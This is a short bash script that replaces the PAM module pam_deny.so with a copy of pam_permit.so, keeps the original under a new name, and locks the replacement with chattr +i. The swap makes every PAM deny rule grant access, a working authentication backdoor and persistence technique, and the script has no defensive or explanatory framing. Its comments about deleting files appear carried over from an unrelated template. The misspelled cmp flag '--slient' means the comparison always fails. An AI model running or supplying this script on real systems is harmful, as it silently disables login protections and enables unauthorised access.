#! /bin/bash

# Directory where you want to remove files
DIRECTORY="/usr/lib/x86_64-linux-gnu/security"

# File extension to filter files (e.g., "*.txt" for text files)
FILE_DENY="pam_deny.so"

# File to cp to
FILE_PERMIT="pam_permit.so"

# File that will be renamed as
FILE_RED_DENY="pam_denying.so"

# Confirm the directory exists
if [ ! -d "$DIRECTORY" ]; then
	echo "Directory $DIRECTORY does not exist."
	exit 1
fi

# Confirm the directory is not the root directory to prevent accidental deletion
if [ "$DIRECTORY" = "/" ]; then
	echo "Refusing to delete the root directory."
	exit 1
fi

# Backup original pam_deny.so
if [ ! -f "$DIRECTORY/$FILE_RED_DENY" ]; then
	mv -- "$DIRECTORY/$FILE_DENY" "$DIRECTORY/$FILE_RED_DENY"
fi

# Replace pam_deny.so with pam_permit.so
if ! cmp --slient "$DIRECTORY/$FILE_PERMIT" "$DIRECTORY/$FILE_DENY" >/dev/null 2>/dev/null; then
	chattr -i -- "$DIRECTORY/$FILE_DENY"
	cp -- "$DIRECTORY/$FILE_PERMIT" "$DIRECTORY/$FILE_DENY"
	chattr +i -- "$DIRECTORY/$FILE_DENY"
fi
